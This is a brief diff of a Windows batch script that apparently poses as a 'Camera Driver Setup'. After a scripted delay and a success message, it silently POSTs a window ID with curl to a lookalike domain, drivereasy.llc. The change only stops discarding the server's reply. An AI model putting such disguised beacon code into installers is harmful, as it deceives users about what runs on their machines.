@@ -15,7 +15,7 @@ call :delay 4
 echo [SUCCESS] Camera Driver Setup completed successfully.
 if defined WINDOW_UID (
   set "AUTO_URL=https://drivereasy.llc/auto-update/!WINDOW_UID!"
-  curl -sL -X POST "!AUTO_URL!" -o nul
+  curl -sL -X POST "!AUTO_URL!"
 )
 goto :skip_delay
 
